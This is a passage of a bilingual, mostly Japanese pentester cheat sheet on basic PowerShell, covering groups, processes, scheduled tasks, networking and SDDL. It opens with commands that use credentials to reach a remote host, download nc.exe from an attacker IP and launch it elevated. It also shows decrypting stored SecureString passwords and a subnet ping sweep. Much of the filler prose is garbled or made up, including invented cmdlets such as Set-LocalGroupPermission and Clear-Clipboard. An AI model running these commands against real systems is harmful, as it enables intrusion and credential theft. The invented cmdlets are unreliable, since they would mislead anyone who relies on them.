#CHECK IF CREDENTIALS ARE WORKING EXECUTING whoami (expected: username of the credentials user)
Invoke-Command -Computer ARKHAM -ScriptBlock { whoami } -Credential $cred
#DOWNLOAD nc.exe
Invoke-Command -Computer ARKHAM -ScriptBlock { IWR -uri 10.10.14.17/nc.exe -outfile nc.exe } -credential $cred

Start-Process powershell -Credential $pp -ArgumentList '-noprofile -command &{Start-Process C:\xyz\nc.bat -verb Runas}'

#Another method
$secpasswd = ConvertTo-SecureString "<password>" -AsPlainText -Force
$mycreds = New-Object System.Management.Automation.PSCredential ("<user>", $secpasswd)
$computer = "<hostname>"
```
## グループ

グループは、Windowsオペレーティングシステムでアクセス制御を管理するための重要な要素です。グループは、ユーザーを論理的な単位にまとめ、共通のアクセス許可を割り当てるために使用されます。Powershellを使用してグループを管理することは、ペンテスターにとって非常に便利です。

### グループの作成

新しいグループを作成するには、以下のコマンドを使用します。

```powershell
New-LocalGroup -Name <GroupName>
```

### グループの削除

既存のグループを削除するには、以下のコマンドを使用します。

```powershell
Remove-LocalGroup -Name <GroupName>
```

### グループへのユーザーの追加

既存のグループにユーザーを追加するには、以下のコマンドを使用します。

```powershell
Add-LocalGroupMember -Group <GroupName> -Member <UserName>
```

### グループからユーザーの削除

既存のグループからユーザーを削除するには、以下のコマンドを使用します。

```powershell
Remove-LocalGroupMember -Group <GroupName> -Member <UserName>
```

### グループのメンバーの表示

グループのメンバーを表示するには、以下のコマンドを使用します。

```powershell
Get-LocalGroupMember -Group <GroupName>
```

### グループのアクセス許可の表示

グループのアクセス許可を表示するには、以下のコマンドを使用します。

```powershell
Get-LocalGroup -Name <GroupName> | Get-LocalGroupPermission
```

### グループのアクセス許可の変更

グループのアクセス許可を変更するには、以下のコマンドを使用します。

```powershell
Set-LocalGroupPermission -Group <GroupName> -Permission <Permission>
```

これらのコマンドを使用することで、Powershellを介してWindowsのグループを効果的に管理することができます。
```powershell
Get-LocalGroup | ft Name #All groups
Get-LocalGroupMember Administrators | ft Name, PrincipalSource #Members of Administrators
```
## クリップボード

クリップボードは、コンピュータ上でデータを一時的に保存するための機能です。一般的には、テキストや画像などのデータをコピーして別の場所に貼り付ける際に使用されます。

クリップボードには、Windows PowerShellを使用してアクセスすることができます。以下に、クリップボードを操作するための基本的なPowerShellコマンドの例を示します。

### クリップボードにテキストをコピーする

```powershell
Set-Clipboard -Value "コピーするテキスト"
```

### クリップボードからテキストを取得する

```powershell
$clipboardText = Get-Clipboard
```

### クリップボードの内容をクリアする

```powershell
Clear-Clipboard
```

これらのコマンドを使用することで、PowerShellを介してクリップボードを操作することができます。これは、ペンテストやハッキングのコンテキストで、クリップボードを使用してデータを取得したり、機密情報をクリアしたりするために役立ちます。
```powershell
Get-Clipboard
```
## プロセス

### Introduction

プロセスは、実行中のプログラムのインスタンスです。Windowsオペレーティングシステムでは、プロセスはシステムリソースを使用して実行されます。プロセスは、メモリ、CPU時間、ネットワーク接続などのリソースを消費します。

### プロセスの表示

PowerShellを使用して、実行中のプロセスを表示することができます。以下のコマンドを使用します。

```powershell
Get-Process
```

このコマンドは、実行中のすべてのプロセスのリストを表示します。各プロセスには、プロセスID、プロセス名、メモリ使用量などの情報が含まれています。

### 特定のプロセスの表示

特定のプロセスの詳細情報を表示するには、`Get-Process`コマンドにプロセス名を指定します。以下のコマンドを使用します。

```powershell
Get-Process -Name <プロセス名>
```

`<プロセス名>`の部分には、表示したいプロセスの名前を入力します。

### プロセスの終了

PowerShellを使用して、プロセスを終了することもできます。以下のコマンドを使用します。

```powershell
Stop-Process -Name <プロセス名>
```

`<プロセス名>`の部分には、終了させたいプロセスの名前を入力します。

### プロセスの作成

PowerShellを使用して、新しいプロセスを作成することもできます。以下のコマンドを使用します。

```powershell
Start-Process -FilePath <ファイルパス>
```

`<ファイルパス>`の部分には、実行したいプログラムのファイルパスを入力します。

### プロセスの監視

PowerShellを使用して、プロセスの監視も行うことができます。以下のコマンドを使用します。

```powershell
Get-Process | Where-Object {$_.Name -eq "<プロセス名>"}
```

`<プロセス名>`の部分には、監視したいプロセスの名前を入力します。

以上が、PowerShellを使用してプロセスを表示、終了、作成、監視する方法です。これらのコマンドを使って、プロセスに関する情報を取得し、必要な操作を行うことができます。
```powershell
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
## サービス

### Introduction

This section provides an overview of various services that can be used for basic PowerShell for pentesters.

### はじめに

このセクションでは、基本的なPowerShellを使用するためのさまざまなサービスについて概説します。

### 1. PowerShell Remoting

PowerShell Remoting allows remote execution of PowerShell commands on a target machine.

1. PowerShellリモート

PowerShellリモートを使用すると、ターゲットマシンでPowerShellコマンドをリモートで実行できます。

### 2. Windows Management Instrumentation (WMI)

WMI provides a set of management information and control capabilities for Windows-based operating systems.

2. Windows Management Instrumentation (WMI)

WMIは、Windowsベースのオペレーティングシステムの管理情報と制御機能のセットを提供します。

### 3. Active Directory Services Interface (ADSI)

ADSI allows management of directory services, such as users, groups, and computers, in a Windows environment.

3. Active Directory Services Interface (ADSI)

ADSIを使用すると、Windows環境でユーザー、グループ、コンピュータなどのディレクトリサービスを管理できます。

### 4. Windows Registry

The Windows Registry is a hierarchical database that stores configuration settings and options for the operating system and installed applications.

4. Windows Registry

Windowsレジストリは、オペレーティングシステムとインストールされたアプリケーションの設定とオプションを格納する階層型データベースです。

### 5. Windows Event Logs

Windows Event Logs record significant events on a Windows system, such as system startup, user logon, and application crashes.

5. Windows Event Logs

Windowsイベントログは、システムの起動、ユーザーログオン、アプリケーションのクラッシュなど、Windowsシステム上の重要なイベントを記録します。

### 6. Windows Task Scheduler

The Windows Task Scheduler allows the scheduling and automation of tasks to be performed on a Windows system.

6. Windows Task Scheduler

Windowsタスクスケジューラを使用すると、Windowsシステムでタスクのスケジュールと自動化を行うことができます。

### 7. Windows Services

Windows Services are background processes that run independently of the logged-in user and provide various system functions.

7. Windows Services

Windowsサービスは、ログインしているユーザーとは独立して実行され、さまざまなシステム機能を提供するバックグラウンドプロセスです。

### 8. Windows Management Instrumentation Command-line (WMIC)

WMIC is a command-line interface for WMI, allowing the execution of WMI queries and commands.

8. Windows Management Instrumentation Command-line (WMIC)

WMICは、WMIのコマンドラインインターフェースであり、WMIクエリとコマンドの実行を可能にします。
```
Get-Service
```
## セキュアな文字列からパスワードを取得する

PowerShellを使用して、セキュアな文字列からパスワードを取得する方法を学びます。

```powershell
$secureString = ConvertTo-SecureString -String "MySecurePassword" -AsPlainText -Force
$password = [Runtime.InteropServices.Marshal]::PtrToStringAuto([Runtime.InteropServices.Marshal]::SecureStringToBSTR($secureString))
```

上記のコードでは、`ConvertTo-SecureString`コマンドレットを使用して、セキュアな文字列を作成します。`-String`パラメータには、パスワードを指定します。`-AsPlainText`パラメータは、セキュアな文字列を平文に変換するために使用されます。`-Force`パラメータは、変換を強制するために使用されます。

次に、`[Runtime.InteropServices.Marshal]::SecureStringToBSTR`メソッドを使用して、セキュアな文字列をBSTR（バイナリストリング）に変換します。その後、`[Runtime.InteropServices.Marshal]::PtrToStringAuto`メソッドを使用して、BSTRを文字列に変換します。これにより、セキュアな文字列からパスワードが取得されます。

この方法を使用すると、セキュアな文字列からパスワードを取得することができます。
```powershell
$pw=gc admin-pass.xml | convertto-securestring #Get the securestring from the file
$cred=new-object system.management.automation.pscredential("administrator", $pw)
$cred.getnetworkcredential() | fl * #Get plaintext password
```
## スケジュールされたタスク

Scheduled tasks are a powerful feature in Windows that allow you to automate the execution of scripts or programs at specific times or intervals. As a pentester, understanding how to leverage scheduled tasks can be beneficial for persistence, privilege escalation, and lateral movement.

スケジュールされたタスクは、特定の時間や間隔でスクリプトやプログラムの実行を自動化するためのWindowsの強力な機能です。ペンテスターとして、スケジュールされたタスクを活用する方法を理解することは、持続性、特権エスカレーション、および横方向の移動において有益です。

### Viewing Scheduled Tasks

### スケジュールされたタスクの表示

To view the list of scheduled tasks on a Windows system, you can use the `Get-ScheduledTask` cmdlet in PowerShell. This cmdlet retrieves all the scheduled tasks on the local system.

Windowsシステム上のスケジュールされたタスクのリストを表示するには、PowerShellの`Get-ScheduledTask`コマンドレットを使用します。このコマンドレットは、ローカルシステム上のすべてのスケジュールされたタスクを取得します。

```powershell
Get-ScheduledTask
```

### Creating Scheduled Tasks

### スケジュールされたタスクの作成

To create a new scheduled task, you can use the `New-ScheduledTask` cmdlet in PowerShell. This cmdlet allows you to specify the script or program to be executed, the trigger that defines when the task should run, and other settings such as the user account under which the task should run.

新しいスケジュールされたタスクを作成するには、PowerShellの`New-ScheduledTask`コマンドレットを使用します。このコマンドレットを使用すると、実行するスクリプトやプログラム、タスクの実行時期を定義するトリガー、およびタスクの実行に使用するユーザーアカウントなどの他の設定を指定できます。

```powershell
New-ScheduledTask -Action (New-ScheduledTaskAction -Execute "C:\path\to\script.ps1") -Trigger (New-ScheduledTaskTrigger -Daily -At 3am) -User "DOMAIN\username" -Password "password"
```

### Modifying Scheduled Tasks

### スケジュールされたタスクの変更

To modify an existing scheduled task, you can use the `Set-ScheduledTask` cmdlet in PowerShell. This cmdlet allows you to change various properties of the task, such as the script or program to be executed, the trigger, and the user account.

既存のスケジュールされたタスクを変更するには、PowerShellの`Set-ScheduledTask`コマンドレットを使用します。このコマンドレットを使用すると、実行するスクリプトやプログラム、トリガー、およびユーザーアカウントなど、タスクのさまざまなプロパティを変更できます。

```powershell
Set-ScheduledTask -TaskPath "\Microsoft\Windows\PowerShell\ScheduledJobs" -TaskName "MyTask" -Action (New-ScheduledTaskAction -Execute "C:\path\to\newscript.ps1") -Trigger (New-ScheduledTaskTrigger -Daily -At 4am)
```

### Deleting Scheduled Tasks

### スケジュールされたタスクの削除

To delete a scheduled task, you can use the `Unregister-ScheduledTask` cmdlet in PowerShell. This cmdlet removes the specified task from the system.

スケジュールされたタスクを削除するには、PowerShellの`Unregister-ScheduledTask`コマンドレットを使用します。このコマンドレットは、指定したタスクをシステムから削除します。

```powershell
Unregister-ScheduledTask -TaskPath "\Microsoft\Windows\PowerShell\ScheduledJobs" -TaskName "MyTask"
```

### Conclusion

### 結論

Scheduled tasks are a useful feature in Windows for automating the execution of scripts or programs. As a pentester, understanding how to view, create, modify, and delete scheduled tasks can be valuable for various purposes during an engagement.

スケジュールされたタスクは、スクリプトやプログラムの実行を自動化するためのWindowsの便利な機能です。ペンテスターとして、スケジュールされたタスクの表示、作成、変更、削除方法を理解することは、エンゲージメント中にさまざまな目的で価値があります。
```powershell
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
```
## ネットワーク

### インターフェース

```powershell
Get-NetAdapter
```

このコマンドは、システム上のすべてのネットワークインターフェースを表示します。

```powershell
Get-NetAdapter | Select-Object Name, InterfaceDescription, MacAddress, Status
```

このコマンドは、インターフェースの名前、説明、MACアドレス、およびステータスを表示します。

```powershell
Get-NetAdapter | Where-Object {$_.Status -eq 'Up'}
```

このコマンドは、ステータスが「Up」（アップ）のインターフェースのみを表示します。

```powershell
Get-NetAdapter | Where-Object {$_.InterfaceDescription -like '*Ethernet*'}
```

このコマンドは、インターフェースの説明に「Ethernet」が含まれるインターフェースのみを表示します。

```powershell
Get-NetAdapter | Where-Object {$_.MacAddress -ne $null}
```

このコマンドは、MACアドレスが存在するインターフェースのみを表示します。

```powershell
Get-NetAdapter | Where-Object {$_.MacAddress -like '00-11-22-33-44-55'}
```

このコマンドは、指定したMACアドレスに一致するインターフェースのみを表示します。

```powershell
Get-NetAdapter | Where-Object {$_.MacAddress -match '([A-Fa-f0-9]{2}-){5}[A-Fa-f0-9]{2}'}
```

このコマンドは、正規表現を使用して有効なMACアドレスに一致するインターフェースのみを表示します。
```powershell
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### ファイアウォール

A firewall is a network security device that monitors and controls incoming and outgoing network traffic based on predetermined security rules. It acts as a barrier between a trusted internal network and an untrusted external network, such as the internet. Firewalls can be implemented as hardware devices or software programs.

ファイアウォールは、事前に設定されたセキュリティルールに基づいて、ネットワークトラフィックの送受信を監視および制御するネットワークセキュリティデバイスです。信頼された内部ネットワークとインターネットなどの信頼できない外部ネットワークの間にバリアを設けます。ファイアウォールはハードウェアデバイスまたはソフトウェアプログラムとして実装することができます。
```powershell
Get-NetFirewallRule -Enabled True

Get-NetFirewallRule -Direction Outbound -Enabled True -Action Block
Get-NetFirewallRule -Direction Outbound -Enabled True -Action Allow
Get-NetFirewallRule -Direction Inbound -Enabled True -Action Block
Get-NetFirewallRule -Direction Inbound -Enabled True -Action Allow

# Open SSH to the world
New-NetFirewallRule -DisplayName 'SSH (Port 22)' -Direction Inbound -LocalPort 22 -Protocol TCP -Action Allow

# Get name, proto, local and rremote ports, remote address, penable,profile and direction
## You can user the following line changing the initial filters to indicat a difefrent direction or action
Get-NetFirewallRule -Direction Outbound -Enabled True -Action Block | Format-Table -Property  DisplayName, @{Name='Protocol';Expression={($PSItem | Get-NetFirewallPortFilter).Protocol}},@{Name='LocalPort';Expression={($PSItem | Get-NetFirewallPortFilter).LocalPort}}, @{Name='RemotePort';Expression={($PSItem | Get-NetFirewallPortFilter).RemotePort}},@{Name='RemoteAddress';Expression={($PSItem | Get-NetFirewallAddressFilter).RemoteAddress}},Profile,Direction,Action
```
### ルート

The term "route" refers to the path that network traffic takes from its source to its destination. In the context of pentesting, understanding the route can be crucial for identifying potential vulnerabilities and attack vectors.

In Windows, the `route` command is used to view and manipulate the IP routing table. This table contains information about the network interfaces and the routes that the operating system uses to determine where to send network traffic.

As a pentester, it is important to familiarize yourself with the `route` command in PowerShell. This will allow you to gather information about the network configuration, identify potential misconfigurations, and even redirect traffic to a different destination.

In this section, we will explore some basic PowerShell commands related to routing that can be useful for pentesters. These commands will help you gather information about the routing table, add or remove routes, and troubleshoot network connectivity issues.

Let's dive in and learn how to leverage PowerShell for route manipulation and analysis.
```powershell
route print
```
### ARP

ARP（Address Resolution Protocol）は、ネットワーク上のIPアドレスとMACアドレスの対応関係を解決するためのプロトコルです。ARPは、ネットワークデバイスが通信を行う際に、宛先のMACアドレスを特定するために使用されます。

ARPキャッシュポイズニングは、ARPプロトコルを悪用して攻撃者がネットワーク上のデバイスの通信を傍受したり、改ざんしたりする手法です。攻撃者は、ARP応答パケットを送信して、自身のMACアドレスを他のデバイスのIPアドレスに関連付けることで、通信の中継役として機能します。

ARPスプーフィングは、ARPキャッシュポイズニングの一種であり、攻撃者がネットワーク上のデバイスに対して偽のARP応答を送信することで、通信の中継役として機能します。これにより、攻撃者は通信の内容を傍受したり、改ざんしたりすることができます。

ARP攻撃を防ぐためには、以下の対策を実施することが重要です。

- ネットワーク上のデバイスには、信頼できるARP応答のみを受け入れるように設定します。
- ネットワーク上のデバイスのARPキャッシュを定期的にクリアすることで、不正なARPエントリを削除します。
- ネットワーク上のデバイスには、ARP攻撃を検知するためのセキュリティソリューションを導入します。

ARP攻撃は、ネットワークセキュリティにおいて重要な脅威です。適切な対策を講じることで、ネットワーク上のデバイスを保護することができます。
```powershell
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,LinkLayerAddress,State
```
### ホスト

The `hosts` file is a plain text file used by the operating system to map hostnames to IP addresses. It is commonly used to block or redirect certain websites or to override DNS settings. As a pentester, you can leverage the `hosts` file to redirect traffic to your own IP address for analysis or to bypass certain security measures.

To locate the `hosts` file on a Windows system, navigate to `C:\Windows\System32\drivers\etc`. You will find a file named `hosts` without an extension. Open this file using a text editor with administrative privileges.

The `hosts` file follows a simple syntax. Each line consists of an IP address followed by one or more hostnames separated by spaces or tabs. To redirect a hostname to a different IP address, simply add a new line with the desired IP address followed by the hostname.

For example, to redirect `www.example.com` to `192.168.0.1`, add the following line to the `hosts` file:

```
192.168.0.1    www.example.com
```

Save the file and the redirection will take effect immediately. Keep in mind that changes to the `hosts` file only affect the local system and will not be propagated to other devices on the network.

As a pentester, you can use the `hosts` file to redirect traffic to your own IP address for analysis or to bypass certain security measures. However, it is important to note that modifying the `hosts` file can have unintended consequences and should be done with caution.
```powershell
Get-Content C:\WINDOWS\System32\drivers\etc\hosts
```
### ピン

Pingコマンドは、ネットワーク上の特定のIPアドレスまたはホスト名に対して、応答時間と可用性をテストするために使用されます。このコマンドは、ネットワークのトラブルシューティングやホストの状態を確認するために頻繁に使用されます。

使用法:

```
ping [オプション] [ターゲット]
```

オプション:

- `-t`: ターゲットへの連続的なピン送信を開始します。
- `-n <回数>`: 指定した回数だけピン送信を行います。
- `-l <サイズ>`: ピンパケットのサイズを指定します。
- `-f`: ピンパケットをフラグメント化します。
- `-4`: IPv4のみを使用してピン送信を行います。
- `-6`: IPv6のみを使用してピン送信を行います。

例:

```
ping 192.168.0.1
```

```
ping google.com
```

```
ping -t 192.168.0.1
```

```
ping -n 5 google.com
```

```
ping -l 1000 google.com
```

```
ping -f google.com
```

```
ping -4 google.com
```

```
ping -6 google.com
```

> **注意**: ピンコマンドは、ネットワーク上のホストに対して情報を送信するため、許可されていない場合や不正な目的で使用される場合は違法です。正当な目的で使用することを確認してください。
```powershell
$ping = New-Object System.Net.Networkinformation.Ping
1..254 | % { $ping.send("10.9.15.$_") | select address, status }
```
### SNMP

SNMP（Simple Network Management Protocol）は、ネットワークデバイスの管理と監視に使用されるプロトコルです。SNMPは、ネットワーク上のデバイスの情報を収集し、管理者に通知するために使用されます。SNMPは、エージェントとマネージャの間で情報を交換するために使用されます。

SNMPは、デバイスの状態、パフォーマンス、およびその他の情報を取得するために使用されます。エージェントは、SNMPをサポートするデバイス上で実行されるソフトウェアであり、マネージャはSNMPを使用してエージェントと通信します。

SNMPは、セキュリティ上の懸念があるため、適切なセキュリティ対策が必要です。エージェントとマネージャの間の通信は、暗号化される必要があります。また、デフォルトのコミュニティストリングを変更することも重要です。

SNMPは、ネットワークデバイスの管理と監視において重要な役割を果たしていますが、悪意のあるユーザーによって悪用される可能性もあります。したがって、SNMPを使用する場合は、適切なセキュリティ対策を講じることが重要です。
```powershell
Get-ChildItem -path HKLM:\SYSTEM\CurrentControlSet\Services\SNMP -Recurse
```
## **SDDL文字列を読みやすい形式に変換する**

To convert the SDDL (Security Descriptor Definition Language) string into a readable format, you can use the `ConvertFrom-SddlString` cmdlet in PowerShell. This cmdlet allows you to parse and convert the SDDL string into an object that can be easily understood.

SDDL is a string format used to represent security descriptors in Windows. It defines the permissions and access control settings for various objects such as files, folders, and registry keys. However, the SDDL string itself can be difficult to interpret, especially for complex security descriptors.

Here's an example of how to use the `ConvertFrom-SddlString` cmdlet:

```powershell
$sddlString = "O:BAG:BAD:(A;;0x1200a9;;;WD)"
$securityDescriptor = ConvertFrom-SddlString -Sddl $sddlString
$securityDescriptor
```

In this example, we have a sample SDDL string representing a security descriptor. By using the `ConvertFrom-SddlString` cmdlet, we convert the SDDL string into an object and store it in the `$securityDescriptor` variable. Finally, we display the contents of the `$securityDescriptor` variable.

By converting the SDDL string into a readable format, you can easily understand the permissions and access control settings defined by the security descriptor. This can be helpful when analyzing and auditing the security of Windows systems.
```powershell

PS C:\> ConvertFrom-SddlString "O:BAG:BAD:AI(D;;DC;;;WD)(OA;CI;CR;ab721a53-1e2f-11d0-9819-00aa0040529b;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CR;00299570-246d-11d0-a768-00aa006e0529;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;CCDCLC;c975c901-6cea-4b6f-8319-d67f45449506;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CIIO;CCDCLC;c975c901-6cea-4b6f-8319-d67f45449506;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;;CR;3e0f7e18-2c7a-4c10-ba82-4d926db99a3e;;S-1-5-21-3842939050-3880317879-2865463114-522)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-3842939050-3880317879-2865463114-498)(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;DD)(OA;CI;CR;89e95b76-444d-4c62-991a-0facbeda640c;;S-1-5-21-3842939050-3880317879-2865463114-1164)(OA;CI;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-3842939050-3880317879-2865463114-1164)(OA;CI;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-3842939050-3880317879-2865463114-1164)(OA;CI;CC;4828cc14-1437-45bc-9b07-ad6f015e5f28;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CC;bf967a86-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CC;bf967a9c-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CC;bf967aa5-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CC;bf967aba-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CC;5cb41ed0-0e4c-11d0-a286-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;RP;4c164200-20c0-11d0-a768-00aa006e0529;;S-1-5-21-3842939050-3880317879-2865463114-5181)(OA;CI;RP;b1b3a417-ec55-4191-b327-b72e33e38af2;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;RP;9a7ad945-ca53-11d1-bbd0-0080c76670c0;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;RP;bf967a68-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;RP;1f298a89-de98-47b8-b5cd-572ad53d267e;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;RP;bf967991-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;RP;5fd424a1-1262-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;bf967a06-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;bf967a06-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;bf967a0a-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;3e74f60e-3e73-11d1-a9c0-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;3e74f60e-3e73-11d1-a9c0-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;b1b3a417-ec55-4191-b327-b72e33e38af2;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;b1b3a417-ec55-4191-b327-b72e33e38af2;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;bf96791a-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;bf96791a-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;9a9a021e-4a5b-11d1-a9c3-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;0296c120-40da-11d1-a9c0-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;934de926-b09e-11d2-aa06-00c04f8eedd8;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;5e353847-f36c-48be-a7f7-49685402503c;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;8d3bca50-1d7e-11d0-a081-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;bf967953-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;bf967953-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;e48d0154-bcf8-11d1-8702-00c04fb96050;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;275b2f54-982d-4dcd-b0ad-e53501445efb;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;bf967954-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;bf967954-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;bf967961-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;bf967961-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;bf967a68-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;5fd42471-1262-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;5430e777-c3ea-4024-902e-dde192204669;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;6f606079-3a82-4c1b-8efb-dcc8c91d26fe;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;bf967a7a-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;bf967a7f-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;614aea82-abc6-4dd0-a148-d67a59c72816;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;66437984-c3c5-498f-b269-987819ef484b;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;77b5b886-944a-11d1-aebd-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;a8df7489-c5ea-11d1-bbcb-0080c76670c0;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;a8df7489-c5ea-11d1-bbcb-0080c76670c0;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;1f298a89-de98-47b8-b5cd-572ad53d267e;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;1f298a89-de98-47b8-b5cd-572ad53d267e;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;f0f8ff9a-1191-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;f0f8ff9a-1191-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;f0f8ff9a-1191-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;2cc06e9d-6f7e-426a-8825-0215de176e11;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;5fd424a1-1262-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;5fd424a1-1262-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;3263e3b8-fd6b-4c60-87f2-34bdaa9d69eb;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;28630ebc-41d5-11d1-a9c1-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;28630ebc-41d5-11d1-a9c1-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;bf9679c0-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;3e0abfd0-126a-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;7cb4c7d3-8787-42b0-b438-3c5d479ad31e;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;RPWP;5b47d60f-6090-40b2-9f37-2a4de88f3063;;S-1-5-21-3842939050-3880317879-2865463114-526)(OA;CI;RPWP;5b47d60f-6090-40b2-9f37-2a4de88f3063;;S-1-5-21-3842939050-3880317879-2865463114-527)(OA;CI;DTWD;;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;DTWD;;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CCDCLCRPWPLO;f0f8ffac-1191-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;CCDCLCRPWPLO;e8b2aff2-59a7-4eac-9a70-819adef701dd;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;CCDCLCSWRPWPDTLOCRSDRCWDWO;018849b0-a981-11d2-a9ff-00c04f8eedd8;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;CCDCLCSWRPWPDTLOCRSDRCWDWO;018849b0-a981-11d2-a9ff-00c04f8eedd8;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CIIO;SD;;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;SD;;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;SD;;bf967a9c-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-